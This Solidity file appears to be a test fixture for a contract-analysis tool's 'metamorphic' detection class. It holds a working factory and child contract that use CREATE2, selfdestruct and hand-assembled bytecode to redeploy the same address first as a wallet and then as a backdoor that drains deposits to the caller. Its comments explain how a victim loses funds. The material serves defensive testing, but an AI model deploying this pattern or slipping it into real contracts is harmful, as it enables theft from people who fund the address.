// The true metamorphic shape (docs/classes/metamorphic.md): a factory deploys
// a child with a salt, and the child's constructor installs one of two
// hand-written runtimes from inline assembly, chosen by the factory's own
// deployment count. The init code is byte-identical on both deployments: the
// constructor reads the factory's `phase()` through msg.sender, and the new
// contract's creation bytecode is the same both times. The first deployment
// installs runtime A, a wallet that accepts deposits and whose `kill()`
// selfdestructs to its caller. The second deployment, at the same CREATE2
// address after the first was destroyed, installs runtime B, a backdoor whose
// `withdraw()` sends the whole balance to its caller. A victim who funds the
// address the first time, and again after the attacker has destroyed and
// rewound it, loses both payments.
//
// solc's runtime artefact for MetaSwitchChild is a stub, not either installed
// runtime, so the class's law REFUSES this fixture by name (the child's
// constructor uses inline assembly) and never reads it as the deployed code.
// The FOUND comes only from the EVM witness on Shanghai, where SELFDESTRUCT
// frees the CREATE2 address; the law's refusal stays a refusal.
//
// The declared deposit/kill/withdraw functions are the external shape the
// witness selects on. The constructor's assembly returns before any of them
// would run, so the installed runtime is the assembly, never their compiled
// bodies.
// pinned to 0.8.20: the EVM witness replays this creation code on shanghai,
// and a newer solc defaults to the Cancun target, whose init code carries
// MCOPY (0x5e), an opcode shanghai does not activate
pragma solidity 0.8.20;

contract MetaSwitchChild {
    constructor() {
        // the factory stores its deployment count before the create, so the
        // same init code reads a different value on the second deployment
        (bool ok, bytes memory ret) = msg.sender.staticcall(abi.encodeWithSignature("phase()"));
        require(ok, "phase");
        uint256 phase_ = abi.decode(ret, (uint256));

        uint256 killSel = uint256(uint32(bytes4(keccak256("kill()"))));
        uint256 withdrawSel = uint256(uint32(bytes4(keccak256("withdraw()"))));
        assembly {
            let p := mload(0x40)
            // selector = calldataload(0) >> 224, compared with the chosen one
            mstore8(p, 0x60)
            mstore8(add(p, 1), 0x00)
            mstore8(add(p, 2), 0x35)
            mstore8(add(p, 3), 0x60)
            mstore8(add(p, 4), 0xe0)
            mstore8(add(p, 5), 0x1c)
            let sel := killSel
            if iszero(eq(phase_, 1)) { sel := withdrawSel }
            mstore8(add(p, 6), 0x63)
            mstore8(add(p, 7), byte(28, sel))
            mstore8(add(p, 8), byte(29, sel))
            mstore8(add(p, 9), byte(30, sel))
            mstore8(add(p, 10), byte(31, sel))
            mstore8(add(p, 11), 0x14)
            mstore8(add(p, 12), 0x60)
            mstore8(add(p, 13), 0x10)
            mstore8(add(p, 14), 0x57)
            mstore8(add(p, 15), 0x00)
            mstore8(add(p, 16), 0x5b)
            if eq(phase_, 1) {
                // runtime A: kill() selfdestructs to the caller, any other
                // call (deposit included) is accepted
                mstore8(add(p, 17), 0x33)
                mstore8(add(p, 18), 0xff)
                return(p, 19)
            }
            // runtime B: withdraw() sends the balance to the caller, any other
            // call (deposit included) is accepted
            mstore8(add(p, 17), 0x60)
            mstore8(add(p, 18), 0x00)
            mstore8(add(p, 19), 0x60)
            mstore8(add(p, 20), 0x00)
            mstore8(add(p, 21), 0x60)
            mstore8(add(p, 22), 0x00)
            mstore8(add(p, 23), 0x60)
            mstore8(add(p, 24), 0x00)
            mstore8(add(p, 25), 0x47)
            mstore8(add(p, 26), 0x33)
            mstore8(add(p, 27), 0x5a)
            mstore8(add(p, 28), 0xf1)
            mstore8(add(p, 29), 0x50)
            mstore8(add(p, 30), 0x00)
            return(p, 31)
        }
    }

    function deposit() external payable {}

    function kill() external {}

    function withdraw() external {}
}

contract MetaSwitch {
    uint256 public phase;

    function deploy(bytes32 salt) external returns (address) {
        phase += 1;
        MetaSwitchChild c = new MetaSwitchChild{salt: salt}();
        return address(c);
    }
}
